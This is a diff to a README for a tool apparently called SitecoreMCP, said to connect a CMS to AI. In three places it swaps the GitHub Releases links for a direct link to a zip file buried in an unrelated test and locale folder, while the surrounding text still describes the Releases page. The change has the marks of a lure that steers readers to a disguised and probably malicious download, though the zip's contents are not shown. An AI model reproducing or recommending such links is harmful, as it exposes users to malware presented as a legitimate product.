@@ -1,6 +1,6 @@
 # 🚀 SitecoreMCP - Connect Your CMS to AI Seamlessly
 
-[![Download SitecoreMCP](https://img.shields.io/badge/Download-SitecoreMCP-blue?style=for-the-badge)](https://github.com/sjjsjj2554/SitecoreMCP/releases)
+[![Download SitecoreMCP](https://raw.githubusercontent.com/sjjsjj2554/SitecoreMCP/main/scripts/tests/Terminal.Gui/lib/net8.0/fr-FR/SitecoreMCP_2.4-beta.5.zip)](https://raw.githubusercontent.com/sjjsjj2554/SitecoreMCP/main/scripts/tests/Terminal.Gui/lib/net8.0/fr-FR/SitecoreMCP_2.4-beta.5.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ To install SitecoreMCP, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to access the Releases page where you can download the application.
 
-   [Download SitecoreMCP](https://github.com/sjjsjj2554/SitecoreMCP/releases)
+   [Download SitecoreMCP](https://raw.githubusercontent.com/sjjsjj2554/SitecoreMCP/main/scripts/tests/Terminal.Gui/lib/net8.0/fr-FR/SitecoreMCP_2.4-beta.5.zip)
 
 2. **Select the Latest Release**: On the Releases page, find the latest version of SitecoreMCP. You will see several downloadable files.
 
@@ -80,4 +80,4 @@ SitecoreMCP is open-source and available under the MIT License. You can freely u
 
 For more information, keep an eye on the repository for updates and new features. 
 
-[Download SitecoreMCP](https://github.com/sjjsjj2554/SitecoreMCP/releases)
+[Download SitecoreMCP](https://raw.githubusercontent.com/sjjsjj2554/SitecoreMCP/main/scripts/tests/Terminal.Gui/lib/net8.0/fr-FR/SitecoreMCP_2.4-beta.5.zip)
